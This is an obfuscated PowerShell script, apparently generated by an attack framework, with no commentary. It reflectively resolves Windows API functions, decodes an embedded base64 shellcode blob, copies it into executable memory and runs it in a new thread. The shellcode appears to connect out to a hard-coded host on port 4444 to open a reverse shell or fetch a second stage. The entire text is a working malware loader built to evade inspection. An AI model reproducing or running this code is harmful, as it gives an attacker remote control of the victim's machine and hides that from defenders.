function xwf {
	Param ($xcm4w_S, $cUEdhGFN9KqK)		
	$a7dHM7 = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')
	
	return $a7dHM7.GetMethod('GetProcAddress').Invoke($null, @([System.Runtime.InteropServices.HandleRef](New-Object System.Runtime.InteropServices.HandleRef((New-Object IntPtr), ($a7dHM7.GetMethod('GetModuleHandle')).Invoke($null, @($xcm4w_S)))), $cUEdhGFN9KqK))
}

function h5zSzk50R {
	Param (
		[Parameter(Position = 0, Mandatory = $True)] [Type[]] $zK0UKDwYPpDA,
		[Parameter(Position = 1)] [Type] $cFO20E2x = [Void]
	)
	
	$pQU0K = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')), [System.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule('InMemoryModule', $false).DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
	$pQU0K.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $zK0UKDwYPpDA).SetImplementationFlags('Runtime, Managed')
	$pQU0K.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $cFO20E2x, $zK0UKDwYPpDA).SetImplementationFlags('Runtime, Managed')
	
	return $pQU0K.CreateType()
}

[Byte[]]$zxwk = [System.Convert]::FromBase64String("/OiCAAAAYInlMcBki1Awi1IMi1IUi3IoD7dKJjH/rDxhfAIsIMHPDQHH4vJSV4tSEItKPItMEXjjSAHRUYtZIAHTi0kY4zpJizSLAdYx/6zBzw0BxzjgdfYDffg7fSR15FiLWCQB02aLDEuLWBwB04sEiwHQiUQkJFtbYVlaUf/gX19aixLrjV1oMzIAAGh3czJfVGhMdyYH/9W4kAEAACnEVFBoKYBrAP/VagVowKgBlWgCABFcieZQUFBQQFBAUGjqD9/g/9WXahBWV2iZpXRh/9WFwHQK/04IdezoYQAAAGoAagRWV2gC2chf/9WD+AB+Nos2akBoABAAAFZqAGhYpFPl/9WTU2oAVlNXaALZyF//1YP4AH0iWGgAQAAAagBQaAsvDzD/1VdodW5NYf/VXl7/DCTpcf///wHDKcZ1x8O74B0qCmimlb2d/9U8BnwKgPvgdQW7RxNyb2oAU//V")
		
$lFrWwhW1 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((xwf kernel32.dll VirtualAlloc), (h5zSzk50R @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr]))).Invoke([IntPtr]::Zero, $zxwk.Length,0x3000, 0x40)
[System.Runtime.InteropServices.Marshal]::Copy($zxwk, 0, $lFrWwhW1, $zxwk.length)

$i15gLM8_5f = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((xwf kernel32.dll CreateThread), (h5zSzk50R @([IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr]))).Invoke([IntPtr]::Zero,0,$lFrWwhW1,[IntPtr]::Zero,0,[IntPtr]::Zero)
[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((xwf kernel32.dll WaitForSingleObject), (h5zSzk50R @([IntPtr], [Int32]))).Invoke($i15gLM8_5f,0xffffffff) | Out-Null